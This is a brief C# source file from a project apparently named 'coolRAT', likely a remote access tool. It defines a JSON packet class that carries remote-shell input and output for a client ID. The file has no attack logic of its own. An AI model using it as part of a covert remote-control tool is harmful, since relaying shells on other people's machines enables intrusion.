using Newtonsoft.Json;
using System;
using System.Collections.Generic;
using System.Text;

namespace coolRAT.Libs.Packets
{
    public enum ChangeType
    {
        Input,
        Output
    }

    public class Shell_IO_ChangedPacket : Packet
    {
        public ChangeType ChangeType;
        public string Change;

        public Shell_IO_ChangedPacket(Guid clientUniqueId, ChangeType changeType, string change) : base(clientUniqueId)
        {
            ChangeType = changeType;
            Change = change;
            Type = "Shell_IO_ChangedPacket";
        }

        public new static Shell_IO_ChangedPacket Deserialize(string packet_string)
        {
            return JsonConvert.DeserializeObject<Shell_IO_ChangedPacket>(packet_string);
        }
    }
}
